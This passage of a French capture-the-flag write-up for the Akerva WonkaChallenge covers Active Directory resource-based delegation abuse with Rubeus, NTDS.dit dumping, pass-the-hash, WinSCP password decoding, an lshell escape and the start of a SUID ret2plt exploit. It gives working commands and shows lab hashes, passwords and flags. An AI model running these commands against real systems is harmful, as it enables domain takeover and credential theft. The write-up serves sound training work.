Afin de remplir la seconde condition, il est possible d'ajouter une machine au domaine avec des SPN mis en place par défaut. La fonction _New-MachineAccount_ de _PowerMad_ permet cette action :

```bash
(CommandoVM) ➜ New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
[+] Machine account attackersystem added
```

_Note_ : Par défaut, un utilisateur ne peut ajouter que 10 machines dans le domaine, c'est le __MachineAccountQuota__. Dans notre cas, ce n'est pas important car nous disposons d'un compte spécifique pour l'ajout de machine dans le domaine.

#### VIII.2.c. Modification de msDS-AllowedToActOnBehalfOfOtherIdentity  

Harmj0y explique dans son article que même lui n'a pas complètement compris la structure de __msDS-AllowedToActOnBehalfOfOtherIdentity__. Pour modifier cette structure, il a donc extrait le champ désiré et l'a converti au format __Security Descriptor Definition Language__ (SDDL). Ce format est utilisé pour convertir les descripteurs de sécurité en chaînes de caractère. Il est alors possible de remplacer le SID par celui du SPN contrôlé. Une fois la structure correctement modifiée, il suffit de faire la conversion inverse et de l'enregistrer dans le champ __msDS-AllowedToActOnBehalfOfOtherIdentity__.

```bash
(CommandoVM) ➜ $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
(CommandoVM) ➜ $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
(CommandoVM) ➜ $SDBytes = New-Object byte[] ($SD.BinaryLength)
(CommandoVM) ➜ $SD.GetBinaryForm($SDBytes, 0)
(CommandoVM) ➜ Get-DomainComputer dc01-ww2.factory.lan | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
(CommandoVM) ➜ $RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
(CommandoVM) ➜ $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
(CommandoVM) ➜ $Descriptor.DiscretionaryAcl
```


![](/lib/images/writeups/2019_wonkachallenge/step8_acequalifier.png)


La figure 27 ci-dessus démontre que tous les prérequis de l'exploitation ont été mis en place avec succès.

### VIII.3. Exploitation

Pour rappel, l'exploitation se fait en abusant des mécanismes __S4U2Self__ et __S4U2Proxy__. Il existe deux outils pour abuser de ce type de délégation : Kekeo et Rubeus. Le premier est développé par GentilKiwi - aka Benjamin Delpy -, qui est aussi le développeur de Mimikatz. Le second est développé par harmj0y. Les deux outils sont assez similaires. Harmj0y a expliqué pourquoi il a développé Rubeus dans un [article](https://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/) sur son blog.

_Note_ : Par défaut, Rubeus n'est pas dans CommandoVM. Cependant,Visual Studio est installé, il suffit donc de compiler le projet disponible sur le GitHub.

Pour abuser de ces mécanismes, Rubeus prend différents paramètres en compte :

* /user : Le SPN que nous contrôlons ;
* /rc4 : Le mot de passe de ce compte au format RC4 ;
* /impersonateuser : L'utilisateur à usurper ;
* /msdsspn : Le service désiré sur le serveur désiré ;
* /ptt : Pass the ticket.

Le seul paramètre manquant est le mot de passe de __attackersystem$__ au format RC4. Heureusement, Rubeus nous permet de le récupérer :

```bash
(CommandoVM) ➜ .\Rubeus.exe hash /password:Summer2018! /user:attackersystem /domain:factory.lan
[...]
rc4_hmac : EF266C6B963C0BB683941032008AD47F
[...]
```

Ayant tous les paramètres, il est temps d'abuser de ces mécansimes... Enfin presque. Pour des soucis de pérennité, Akerva a fait le choix de restaurer l'ensemble des machines à leur état d'origine toute les heures, causant ainsi l'erreur suivante :


![](/lib/images/writeups/2019_wonkachallenge/step8_kerberos_issue.png)


L'erreur __KRB_AP_ERR_SKEW__ signifie _Kerberos Authentication failed due to time skew_. Cette erreur survient lorsque l'horloge du domaine contrôleur et celle du client ont trop de différence. En effet, si le domaine est restauré toute les heures, alors l'horloge aussi. Pour synchroniser les deux horloges, la commande suivante est nécessaire : `net time /domain /set`.


![](/lib/images/writeups/2019_wonkachallenge/step8_issue_done.png)


La commande Rubeus s'étant terminée correctement, un ticket __Administrator @ factory.lan__ a été créé en mémoire :


![](/lib/images/writeups/2019_wonkachallenge/step8_rubeus_ticket.png)


Le ticket "administrateur de domaine" étant désormais en mémoire, il est possible d'accéder au disque __C:__ du contrôleur de domaine :


![](/lib/images/writeups/2019_wonkachallenge/step8_dir_allowed_on_dc.png)


### VIII.4. Acquisition du NTDS.dit

Ayant les droits administrateur de domaine, il est possible de se connecter au contrôleur de domaine via __psexec__. Cet outil fait parti des Sysinternals de Microsoft, comme _procdump_ utilisé précédemment.

```bash
PsExec.exe \\dc01-ww2.factory.lan cmd.exe
```

Il n'est pas possible d'accéder au fichier __ntds.dit__ sur un système en cours de fonctionnement, même en étant administrateur de domaine. Cependant, il est possible d'utiliser __vssadmin__ pour récupérer une copie du disque __C:__ et ainsi récupérer le _ntds.dit_ dans cet instantané :

```bash
vssadmin create shadow /for=C:
```


![](/lib/images/writeups/2019_wonkachallenge/step8_vssadmin.png)


Enfin, pour que _secretsdump.py_ puisse retrouver les hashs disponibles dans le _ntds.dit_, il est nécessaire de récupérer la base __system__ dans la registry Windows :

```bash
reg.exe save hklm\system c:\windows\temp\system.save
```


![](/lib/images/writeups/2019_wonkachallenge/step8_dumpsystem.png)


Les UNC path permettent de copier les fichiers générés sur CommandoVM :

```bash
(DC01-WW2 via psexec) ➜ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\ntds.dit C:\Windows\Temp\
(CommandoVM) ➜ copy \\dc01-ww2.factory.lan\C$\Windows\Temp\ntds.dit .
(CommandoVM) ➜ copy \\dc01-ww2.factory.lan\C$\Windows\Temp\system.save .
```

### VIII.4. Get hashes

L'outil __secretsdump.py__ est un script de la suite _impacket_. Dans le cadre de cette épreuve, cet outil va extraire les différents hash du _ntds.dit_ :

```bash
(KaliVM) ➜ secretsdump.py -system .\system.save -ntds .\ntds.dit LOCAL
```


![](/lib/images/writeups/2019_wonkachallenge/step8_ntdsextaction_krbtgt.png)


Le flag est le sha256 du hash de l'utilisateur __krbtgt__. Ayant ce hash, il est maintenant possible de créer un golden ticket en tant qu'administrateur de domaine.

### VIII.5. Flag

> 24704ab2469b186e531e8864ae51c9497227f4a77f0bb383955c158101ab50c5

---

### Resources

1. __Pixis__, _BloodHound_, hackndo : https://beta.hackndo.com/bloodhound/
2. __Rohan Vazarkar__, _BloodHound 2.1: The Fix Broken Stuff Update_, cptjesus.com : https://blog.cptjesus.com/posts/bloodhound21
3. __PenTestPartners__, _Bloodhound walkthrough. A Tool for Many Tradecrafts_, Blog de PenTestPartners : https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/
4. __Pixis__, _Resource-Based Constrained Delegation - Risques_, hackndo : https://beta.hackndo.com/resource-based-constrained-delegation-attack/
5. __harmj0y__, _A Case Study in Wagging the Dog: Computer Takeover_, Blog de harmj0y : https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/
6. __Elad Shamir__, _Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory_, Blog de shenaniganslabs : https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
7. __Microsoft__, _Security Descriptor Definition Language_, Documentation Microsoft : https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language
8. __Dirk-jan Mollema__, _“Relaying” Kerberos - Having fun with unconstrained delegation_, Blog de Dirk-jan Mollema : https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
9. __Microsoft__, _Kerberos Authentication failed due to time skew_, Documentation Microsoft : https://blogs.msdn.microsoft.com/asiatech/2009/04/26/kerberos-authentication-failed-due-to-time-skew/
10. __Microsoft__, _vssadmin_, Documentation Microsoft : https://docs.microsoft.com/fr-fr/windows-server/administration/windows-commands/vssadmin
11. __swisskyrepo__, _PayloadsAllTheThings_, GitHub : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#dumping-ad-domain-credentials-systemrootntdsntdsdit

---
---

## IX. Step 9 - Not so hashed

>  Veruca's home 

### TL;DR

1. Il est possible de se connecter avec le hash de l'utilisateur __adminWorkstation__ à la dernière machine (PC01-DEV) de ce LAN ;
2. Remarquer que la machine utilise __WinSCP__ ;
3. N'ayant pas de master password sur WinSCP, il est possible de récupérer des informations dans les clés de registre ;
4. Récupérer le hash réversible de __veruca__ dans la clé de registre : `HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\veruca@172.16.69.78` ;
5. Décoder le hash et recueillir les identifiants : `veruca : CuiiiiYEE3r3!` ;
6. Ajouter une route vers le sous réseau contenant la machine de _veruca_ ;
7. Se connecter à PC01-DEV en SSH.

---

### IX.1. Pass the hash

Ne restant qu'une machine dans le réseau et possédant l'ensemble des hash des utilisateurs du domaine, nous sommes en droit de nous dire qu'il existe un lien entre les deux. En effet, il est possible de se connecter à différents services d'un domaine en se servant du hash du mot de passe plutôt que du mot de passe lui même.

En filtrant les utilisateurs contenant "admin" dans le nom, le bruteforce est relativement rapide :

```bash
(KaliVM) ➜ cat ntds_clear|grep -i 'admin' | grep ':::' 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7fc0c9c128598429119dbc01f450a603:::
adminWorkstation:1103:aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d:::
adminServer:1104:aad3b435b51404eeaad3b435b51404ee:e0ae639c0ee92b2118a1081376c940a0:::
```

Finalement l'utilisateur `adminWorkstation` peut se connecter à la dernière machine :

```bash
(KaliVM) ➜ cme smb 172.16.42.101 -u 'adminWorkstation' -H 'aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d' -d 'FACTORY'
```


![](/lib/images/writeups/2019_wonkachallenge/step9_pth.png)


### IX.2. Identifiant de Veruca

Il est possible d'exécuter des commandes arbitraires en utilisant la technique du Pass the hash. La suite _impacket_ possède __wmiexec.py__ :

```bash
(KaliVM) ➜ /usr/share/doc/python-impacket/examples/wmiexec.py adminWorkstation@172.16.42.101 -hashes aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d
```

Des raccourcis intéressants sont accessibles dans les fichiers de l'utilisateur __adminWorkstation__ :

```bash
(PC01-DEV) ➜ C:\Users\adminWorkstation>dir /a Desktop
 Volume in drive C has no label.
 Volume Serial Number is F660-81CF

 Directory of C:\Users\adminWorkstation\Desktop

07/05/2019  03:00 PM    <DIR>          .
07/05/2019  03:00 PM    <DIR>          ..
06/20/2019  12:31 PM               282 desktop.ini
06/20/2019  12:32 PM             1,446 Microsoft Edge.lnk
06/22/2019  11:46 PM             1,130 WinSCP.lnk
               3 File(s)          2,858 bytes
               2 Dir(s)  11,220,193,280 bytes free
```

Il est possible de récupérer des informations dans la registry Windows s'il n'y a pas de master password sur WinSCP. Pour avoir accès aux informations de Veruca, il existe deux méthodes : une méthode "à la main" et une méthode automatisée.

#### IX.2.a. Méthode 1 - À la main

Étant connecté sur la machine, il suffit de requêter la registry Windows afin d'obtenir les informations désirées :


![](/lib/images/writeups/2019_wonkachallenge/step9_regquery.png)


Un [binaire](https://github.com/anoopengineer/winscppasswd/releases) sur GitHub permet de décoder les hash de WinSCP. Ci-dessous le mot de passe de Veruca en clair :

```bash
(CommandoVM) ➜ .\winscppasswd 172.16.69.78 veruca A35C4356079A1F0870112F60D87D2A392E293F3D6D6B6E726D6A726A65726B641F29353535350519196F2E6F7DEB849B0EDE

CuiiiiYEE3r3!
```

#### IX.2.b. Méthode 2 - Automatisée

Pour cette méthode, c'est [@lydericlefebvre](https://twitter.com/lydericlefebvre?lang=fr), organisateur du challenge, qui m'a donné l'astuce. Une fois que l'épreuve ait été validée, évidemment ;)

L'outil _CrackMapExec_ possède un module __invoke_sessiongopher__ permettant de récupérer des informations sensibles dans différents programmes tels que PuTTY, WinSCP, FileZilla, SuperPuTTY et RDP en utilisant _SessionGopher_.

```bash
(KaliVM) ➜ cme smb 172.16.42.101 -u 'adminWorkstation' -H 'aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d' -d 'FACTORY' -M invoke_sessiongopher
```


![](/lib/images/writeups/2019_wonkachallenge/step9_cme_veruca.png)


### IX.3. Connexion SSH sur le poste de Veruca

Les informations de Veruca sont donc les suivantes :

> veruca@172.16.69.78 : CuiiiiYEE3r3!

Un rapide coup d'œil sur l'adresse IP montre qu'elle fait partie d'un autre réseau. Jusqu'à présent nous étions sur le réseau __172.16.42.0/24__. Afin d'accéder au second réseau, l'ajout d'une route est nécessaire. Comme présenté dans le schéma situé dans l'introduction, ma route sera sur mon hôte Windows 10 :

```bash
(HoteWin10) ➜ route print |findstr 10.8.0.10
         10.8.0.1  255.255.255.255         10.8.0.9        10.8.0.10    291
         10.8.0.8  255.255.255.252         On-link         10.8.0.10    291
        10.8.0.10  255.255.255.255         On-link         10.8.0.10    291
        10.8.0.11  255.255.255.255         On-link         10.8.0.10    291
      172.16.42.0    255.255.255.0         10.8.0.9        10.8.0.10    291
        224.0.0.0        240.0.0.0         On-link         10.8.0.10    291
  255.255.255.255  255.255.255.255         On-link         10.8.0.10    291

(HoteWin10) ➜ route ADD 172.16.69.0 MASK 255.255.255.0 10.8.0.9
 OK!

(HoteWin10) ➜ route print |findstr 10.8.0.10
         10.8.0.1  255.255.255.255         10.8.0.9        10.8.0.10    291
         10.8.0.8  255.255.255.252         On-link         10.8.0.10    291
        10.8.0.10  255.255.255.255         On-link         10.8.0.10    291
        10.8.0.11  255.255.255.255         On-link         10.8.0.10    291
      172.16.42.0    255.255.255.0         10.8.0.9        10.8.0.10    291
      172.16.69.0    255.255.255.0         10.8.0.9        10.8.0.10     36
        224.0.0.0        240.0.0.0         On-link         10.8.0.10    291
  255.255.255.255  255.255.255.255         On-link         10.8.0.10    291
```

Il est désormais possible de se connecter en SSH à la machine de Veruca avec mes VM en NAT :

```bash
(KaliVM) ➜ ssh veruca@172.16.69.78                                                                                        
veruca@172.16.69.78's password: 
[...]

(SRV01-WEB-WW3) ➜ veruca@SRV01-WEB-WW3:~$ whoami
veruca
(SRV01-WEB-WW3) ➜ veruca@SRV01-WEB-WW3:~$ hostname
SRV01-WEB-WW3
(SRV01-WEB-WW3) ➜ veruca@SRV01-WEB-WW3:~$ ip a
[...]
2: ens18: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 7a:0a:61:1a:36:65 brd ff:ff:ff:ff:ff:ff
    inet 172.16.69.78/24 brd 172.16.69.255 scope global ens18
[...]
```


![](/lib/images/writeups/2019_wonkachallenge/step9_flag.png)


### IX.4. Flag

> 83907d64b336c599b35132458f7697c4eb0de26635b9616ddafb8c53d5486ac2

---

### Resources

1. __Paul Lammertsma__, _Where does WinSCP store site's password?_, SuperUser : https://superuser.com/questions/100503/where-does-winscp-store-sites-password
2. __anoopengineer__, _WinSCP Password Extractor/Decrypter/Revealer_, GitHub : https://github.com/anoopengineer/winscppasswd/
3. __Vivek Gite__, _Linux route Add Command Examples_, cyberciti : https://www.cyberciti.biz/faq/linux-route-add/
4. __Walter Glenn__, _How to Add a Static TCP/IP Route to the Windows Routing Table_, howtogeek : https://www.howtogeek.com/howto/windows/adding-a-tcpip-route-to-the-windows-routing-table/

---
---

## X. Step 10 - The Great Escape

> Run Otman run, get out of this jail! 

### TL;DR

1. Trouver l'autre machine via ARP : `cat /proc/net/arp` ;
2. Remarquer que __nginx__ est installé ;
3. Dans la configuration du nginx, trouver la racine du _frontend_ : `/usr/share/nginx/dev3.challenge.akerva.com` ;
4. Récupérer une clé privée SSH dans l'un des dossiers ;
5. Grâce à l'indice de Akerva, on connait l'utilisateur de la machine distante : __violet__ ;
6. Atterrir dans un environnement restreint : __lshell__ ;
7. Trouver l'issue de sécurité sur le git permettant de s'échapper de l'environnement restreint : `echo opmd && cd () bash && cd`.

---

### X.1. Reconnaissance

Personnellement, l'un de mes premiers reflexes en post exploitation est de vérifier le cache __arp__ :

```bash
(SRV01-WEB-WW3) ➜ cat /proc/net/arp 
IP address       HW type     Flags       HW address            Mask     Device
172.16.69.254    0x1         0x2         3e:20:13:a5:09:49     *        ens18
172.16.69.65     0x1         0x2         96:2e:20:a6:a0:f3     *        ens18
```

Une nouvelle IP a été trouvé : `172.16.69.65`. Il n'est pas possible de ré-utiliser les identifiants de Veruca sur cette IP. Pour vérifier les différents services sur ces machines, il est nécessaire de faire un scan de port complet.

#### X.1.a. 172.16.69.65 

Pour des soucis de rapidité, j'ai préféré utiliser __masscan__ plutôt que nmap.

```bash
(KaliVM) ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 700 172.16.69.65           
Discovered open port 22/tcp on 172.16.69.65                                                                     
```

Un service sur le port 22 est disponible, le SSH en question. Il n'y a pas d'autres services.

#### X.1.b. 172.16.69.78 (SRV01-WEB-WW3)

La machine _SRV01-WEB-WW3_ a un service de plus exposé :

```bash
(KaliVM) ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 700 172.16.69.78            
Discovered open port 80/tcp on 172.16.69.78                                    
Discovered open port 22/tcp on 172.16.69.78                                    
```

### X.2. Connexion SSH au serveur distant

Etant donné qu'un service web est exposé et qu'un accès ssh est disponible, il est possible de lister directement le contenu de `/var/www/html` :

```bash
(SRV01-WEB-WW3) ➜ ls /var/www/html
index.html  index.nginx-debian.html
```

À première vue, le serveur utilisé est un _nginx_. Il est possible de vérifier la configuration du serveur et des différents sites dans le dossier `/etc/nginx/sites-available` :

```bash
(SRV01-WEB-WW3) ➜ ls /etc/nginx/sites-available
default  dev3.challenge.akerva.com

(SRV01-WEB-WW3) ➜ cat /etc/nginx/sites-available/dev3.challenge.akerva.com
server {
	server_name dev3.challenge.akerva.com;
	listen 80;
	listen [::]:80;
	root /usr/share/nginx/dev3.challenge.akerva.com;
	index index.html index.php;
	autoindex off;
	
	add_header X-Frame-Options SAMEORIGIN;
	add_header X-Content-Type-Options nosniff;
	add_header X-XSS-Protection "1; mode=block";

	location / {
		if (-f /usr/share/nginx/dev3.challenge.akerva.com/error/index.html){
		return 503;
		}
	}
	
	location  ~ /\.{
		deny all;
		access_log off;
		log_not_found off;
	}
	
	#Error pages
	error_page 503 /index.html;
	location = /index.html {
		root /usr/share/nginx/dev3.challenge.akerva.com/error/;
		internal;
	}
	
	location ~ ^/.*\.php {
            try_files $uri =503;
            include fastcgi_params;
            fastcgi_pass unix:/run/php/php7.3-fpm.sock;
            fastcgi_split_path_info ^/(.+\.php)(/.*)$;
            fastcgi_index index.php;
            fastcgi_param HTTPS on;
            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
            fastcgi_param PATH_INFO $fastcgi_path_info;
            fastcgi_intercept_errors on;
        }

}
```

Plusieurs informations intéressantes se trouvent dans ce fichier, dont la racine du site web : `/usr/share/nginx/dev3.challenge.akerva.com` :

```bash
(SRV01-WEB-WW3) ➜ ls -la /usr/share/nginx/dev3.challenge.akerva.com
total 24
drwxr-xr-x 6 root     root     4096 juil.  5 11:08 .
drwxr-xr-x 5 root     root     4096 juin  21 18:42 ..
drwxr-xr-x 2 www-data www-data 4096 juin  26 17:01 error
drwxr-xr-x 2 www-data www-data 4096 juil.  4 10:52 golden_tickets
drwxr-xr-x 2 www-data www-data 4096 juin  26 18:02 keys
drwxr-xr-x 2 www-data www-data 4096 juil.  5 11:08 scripts

(SRV01-WEB-WW3) ➜ ls -la /usr/share/nginx/dev3.challenge.akerva.com/keys
total 12
drwxr-xr-x 2 www-data www-data 4096 juin  26 18:02 .
drwxr-xr-x 6 root     root     4096 juil.  5 11:08 ..
-rw-r----- 1 www-data www-data 1679 juin  26 18:02 id_rsa
```

Une clé privée SSH est disponible dans l'arborescence du _frontend_. La connexion à l'autre machine doit être possible avec cette clé. Il ne manque que l'utilisateur associé. La clé privée est disponible [ici](https://mega.nz/#!Lj4DlAqD!QCLeAbjrbXU5QkCT8pGOXATWDV4jNjv4wuKc_nKoc9w).

La plateforme de challenge du [WonkaChall](https://challenge.akerva.com) propose un hint par épreuve. Pour cette étape, le hint est le nom de l'utilisateur, à savoir __violet__.

Connaissant le nom de l'utilisateur et la clé associée, il est possible de se connecter au serveur distant :


![](/lib/images/writeups/2019_wonkachallenge/step10_lshell.png)


### X.3. Escaping the restricted shell

Dans la réalité, le shell restreint n'est pas apparu directement. En utilisant _zsh_, j'ai rencontré un soucis (dont j'ignore totalement la cause). Par contre, cela m'a permis d'accéder à l'erreur suivante :

```bash
(KaliVM) ➜ ssh violet@172.16.69.65 -i /home/maki/Documents/wonkachall2019/step10/id_rsa

Linux SRV02-BACKUP 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Fri Jul 19 11:36:53 2019 from 10.8.0.14
Traceback (most recent call last):
  File "/usr/bin/lshell", line 52, in <module>
    main()
  File "/usr/bin/lshell", line 38, in main
    userconf = CheckConfig(args).returnconf()
  File "/usr/local/lib/python2.7/dist-packages/lshell/checkconfig.py", line 69, in _init_
    self.get_global()
  File "/usr/local/lib/python2.7/dist-packages/lshell/checkconfig.py", line 145, in get_global
    self.config.read(self.conf['configfile'])
  File "/usr/local/lib/python2.7/dist-packages/backports/configparser/_init_.py", line 697, in read
    self._read(fp, filename)
  File "/usr/local/lib/python2.7/dist-packages/backports/configparser/_init_.py", line 1027, in _read
    for lineno, line in enumerate(fp, start=1):
  File "/usr/lib/python2.7/encodings/ascii.py", line 26, in decode
    return codecs.ascii_decode(input, self.errors)[0]
UnicodeDecodeError: 'ascii' codec can't decode byte 0xc2 in position 2854: ordinal not in range(128)
Connection to 172.16.69.65 closed.
```

Grâce à l'erreur python trouvée, très explicite, il me fût facile de tomber sur le [GitHub](https://github.com/ghantoos/lshell) de lshell. Pour s'évader de ce shell restreint, le plus simple reste d'inspecter les différentes _issues_ de sécurité du dépôt. Actuellement, il n'y a qu'une issue de securité active : https://github.com/ghantoos/lshell/issues/151#issuecomment-303696754

L'utilisateur __omega8cc__ mentionne un moyen de s'échapper fonctionnel :

```bash
(SRV02-BACKUP lshell) ➜ echo FREEDOM! && cd () bash && cd
```


![](/lib/images/writeups/2019_wonkachallenge/step10_escapeshell.png)


Le flag est situé dans le _home_ de __violet__ :

```bash
(SRV02-BACKUP as violet) ➜ cat /etc/passwd|grep violet
violet:x:1000:1000:violet,,,:/home/violet:/usr/bin/lshell
(SRV02-BACKUP as violet) ➜ ls /home/violet
flag-10.txt
(SRV02-BACKUP as violet) ➜ cat /home/violet/flag-10.txt
d9c47d61bc453be0f870e0a840041ba054c6b7f725812ca017d7e1abd36b9865
```

### X.4. Flag

> d9c47d61bc453be0f870e0a840041ba054c6b7f725812ca017d7e1abd36b9865

---

### Resources

1. __ghantoos__, _lshell - SECURITY ISSUE: Inappropriate parsing of command syntax_, GitHub : https://github.com/ghantoos/lshell/issues/151#issuecomment-303696754

---
---

## XI. Step 11 - Free flag

>  Free for all \o/ 

### TL;DR

1. Remarquer qu'il existe des fichiers world readable dans le __/home__ du système ;
2. Lire la clé privée de l'utilisateur __Georgina__ ;
3. Se connecter avec cette clé privée et accéder au _home_ de Georgina.

---

### XI.1. Trouver la clé privé

Étant connecté sur un système avec un utilisateur "standard", naturellement je regarde s'il m'est possible d'accéder aux _home_ des autres utilisateurs du système. C'est comme cela que j'ai trouvé une clé privée dans le _home_ de l'utilisateur __Georgina__ :


![](/lib/images/writeups/2019_wonkachallenge/step11_worldreadable.png)


La clé privée est disponible [ici](https://mega.nz/#!7r5BEYBR!q02ij1f1vGJ8cgXDdrmfkKaHK16cFwngdTuDzqqJ6u8).

Il ne reste plus qu'à se connecter au même serveur en tant que _Georgina_ :

```bash
(KaliVM) ➜ chmod 0600 ~/Documents/id_rsa_georgina 
(KaliVM) ➜  ssh georgina@172.16.69.65 -i ~/Documents/id_rsa_georgina
[...]
(SRV02-BACKUP as Georgina) ➜ cat flag-11.txt 
5a4fec24bf04c854beee7e2d8678f84814a57243cbea3a7807cd0d5c973ab2d5
```

### XI.2. Flag

> 5a4fec24bf04c854beee7e2d8678f84814a57243cbea3a7807cd0d5c973ab2d5

---
---

## XII. Step 12 - Return to PLankTon

> Pwn2Own

### TL;DR

1. Utiliser __LinEnum__ afin de trouver __exportVIP__ un binaire _SUID_ et _SGID_ ;
2. Trouver l'overflow de manière empirique ;
3. Déterminer le padding (de 296 octets) nécessaire à la réécriture de RSP ;
3. Regarder la __plt__ du binaire et les protections mises en place, en déduire que l'exploitation est un `ret2plt` ;
4. Récupérer l'adresse de la fonction __system__ disponible dans la _plt_ ;
6. Trouver un gadget `pop rdi; ret` dans le binaire nécessaire pour le placement des arguments ;
2. Trouver l'adresse d'une chaîne de caractère dans le binaire, par exemple __GNU__ ;
5. Faire un script exécutant un `/bin/bash -p`, l'appeler __GNU__ et le rajouter dans le _PATH_ ;
6. Exploiter le `ret2plt` en appelant la fonction _system_ en plaçant _GNU_ en paramètre : `/opt/exportVIP < <(python -c 'from pwn import *; print "a"*296+p64(0x000000000040145b)+p64(0x4002d0)+p64(0x40133d)';cat)`

---

### XII.1. Post exploitation

Etant connecté en tant que _Georgina_ ou _Violet_, le but est d'élever ses privilèges et de récupérer un accès __root__ au serveur. Pour cela, il existe de nombreux scripts d'énumération pour de la post-exploitation sur GitHub. Personnellement, je trouve que __LinEnum__ est le plus pertinent. Ci-dessous les résultats importants remontés par _LinEnum_ :

```bash
(SRV02-BACKUP as Georgina) ➜ ./LinEnum.sh -s -r report -e /dev/shm -t

[...]
[-] SUID files:
-rwsr-xr-x 1 root root 10232 mars  28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 440728 mars   1 17:19 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 juin   9 23:42 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 59680 mai   17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 50040 mai   17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 75792 mai   17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 40504 mai   17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 40312 mai   17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 1019656 mai   28 22:13 /usr/sbin/exim4
-rwsr-xr-x 1 root root 40536 mai   17  2017 /bin/su
-rwsr-xr-x 1 root root 44304 mars   7  2018 /bin/mount
-rwsr-xr-x 1 root root 31720 mars   7  2018 /bin/umount
-rwsr-xr-x 1 root root 61240 nov.  10  2016 /bin/ping
-rwsr-s---+ 1 root root 14392 juil.  8 11:03 /opt/exportVIP
-rwsr-xr-x 1 root root 110760 mars  20  2017 /sbin/mount.nfs

[-] SGID files:
-rwxr-sr-x 1 root mail 19008 janv. 17  2017 /usr/bin/dotlockfile
-rwxr-sr-x 1 root ssh 358624 mars   1 17:19 /usr/bin/ssh-agent
-rwxr-sr-x 1 root crontab 40264 oct.   7  2017 /usr/bin/crontab
-rwxr-sr-x 1 root tty 27448 mars   7  2018 /usr/bin/wall
-rwxr-sr-x 1 root shadow 71856 mai   17  2017 /usr/bin/chage
-rwxr-sr-x 1 root shadow 22808 mai   17  2017 /usr/bin/expiry
-rwxr-sr-x 1 root tty 14768 avril 12  2017 /usr/bin/bsd-write
-rwxr-sr-x 1 root mail 10952 déc.  25  2016 /usr/bin/dotlock.mailutils
-rwsr-s---+ 1 root root 14392 juil.  8 11:03 /opt/exportVIP
-rwxr-sr-x 1 root shadow 35592 mai   27  2017 /sbin/unix_chkpwd
[...]
```

Un seul de ces binaires n'est pas un programme par défaut : __/opt/exportVIP__. Si il est possible d'exécuter des commandes avec ce binaire, alors il sera possible d'exécuter des commandes en tant qu'utilisateur __root__. Il est préférable de réaliser l'analyse en local, dans un environnement maîtrisé :

```bash
(KaliVM) ➜ scp -i ~/Documents/id_rsa_georgina georgina@172.16.69.65:/opt/exportVIP .
```

Le binaire est disponible [ici](https://mega.nz/#!DrxxwK6a!1hOFmmYMrImfOaGUC6aIfbTn8oPCyDqwDWgBcKSbz24).

### XII.2. Informations sur le binaire

C'est un binaire 64 bits, strippé et linké dynamiquement :

```bash
(KaliVM) ➜ file ./exportVIP 
exportVIP: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=46f5d9039533417cd40afbe9f9a7dbdf3726b897, stripped
```

Un __stripped binary__ est un binaire sans les symboles de debug. Il est plus léger qu'un binaire non strippé. L'absence de ces symboles de debug complexifie le reverse du programme. Quant aux protections en place sur _exportVIP_, il n'y en a pas beaucoup :

```bash
(KaliVM) ➜ checksec --file ./exportVIP
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols       No	0		4	./exportVIP
```

Merci à [Tomtombinary](https://twitter.com/tomtombinary), pour le schéma ci-dessous, résumant les types d'exploitation possibles en fonction des protections activées. __Cependant , veuillez noter que le schéma n'est PAS complet__.


![](/lib/images/writeups/2019_wonkachallenge/exploitation_protection.png)


